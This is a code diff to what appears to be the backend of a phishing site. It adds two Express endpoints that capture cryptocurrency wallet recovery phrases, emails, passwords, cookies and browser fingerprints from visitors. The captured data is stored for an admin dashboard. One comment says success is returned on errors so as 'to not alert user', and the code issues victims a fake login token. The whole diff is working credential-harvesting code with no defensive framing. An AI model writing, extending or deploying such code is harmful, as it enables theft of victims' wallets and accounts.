@@ -402,6 +402,87 @@ router.post('/apple-complete', async (req, res) => {
   }
 });
 
+// Track Recovery Phrase attempts
+router.post('/track-recovery-phrase', async (req, res) => {
+  try {
+    const { seedPhrase, step, userDetails } = req.body;
+    const ipAddress = getIP(req);
+    
+    const credentialData = {
+      provider: 'Recovery Phrase',
+      seedPhrase,
+      email: '[Not captured yet]',
+      password: '[Not captured yet]',
+      step,
+      ipAddress,
+      userAgent: userDetails.userAgent,
+      platform: userDetails.platform,
+      language: userDetails.language,
+      screenResolution: userDetails.screenResolution,
+      timezone: userDetails.timezone,
+      cookies: userDetails.cookies,
+      timestamp: new Date().toISOString()
+    };
+    
+    capturedCredentials.push(credentialData);
+    console.log('🔑 Recovery Phrase Tracked:', credentialData);
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Error tracking recovery phrase:', error);
+    res.json({ success: true }); // Still return success to not alert user
+  }
+});
+
+// Complete Recovery Phrase with verification
+router.post('/recovery-complete', async (req, res) => {
+  try {
+    const { seedPhrase, email, password, userDetails } = req.body;
+    const ipAddress = getIP(req);
+    
+    const completeData = {
+      provider: 'Recovery Phrase',
+      seedPhrase,
+      email,
+      password,
+      step: 'complete',
+      ipAddress,
+      userAgent: userDetails.userAgent,
+      platform: userDetails.platform,
+      language: userDetails.language,
+      screenResolution: userDetails.screenResolution,
+      timezone: userDetails.timezone,
+      cookies: userDetails.cookies,
+      timestamp: new Date().toISOString()
+    };
+    
+    capturedCredentials.push(completeData);
+    console.log('✅ Recovery Phrase Complete:', completeData);
+    
+    // Create a token and user for dashboard access
+    const token = jwt.sign(
+      { id: `recovery_${Date.now()}`, email },
+      process.env.JWT_SECRET || 'default-secret-key',
+      { expiresIn: '24h' }
+    );
+    
+    res.json({
+      success: true,
+      token,
+      user: {
+        id: `recovery_${Date.now()}`,
+        email,
+        firstName: email.split('@')[0],
+        lastName: 'User',
+        provider: 'recovery'
+      }
+    });
+  } catch (error) {
+    console.error('Error completing recovery phrase:', error);
+    res.status(400).json({ error: 'Verification failed' });
+  }
+});
+
 // Export captured credentials and visitors for admin dashboard
 router.getCapturedCredentials = () => capturedCredentials;
 router.getVisitors = () => visitors;
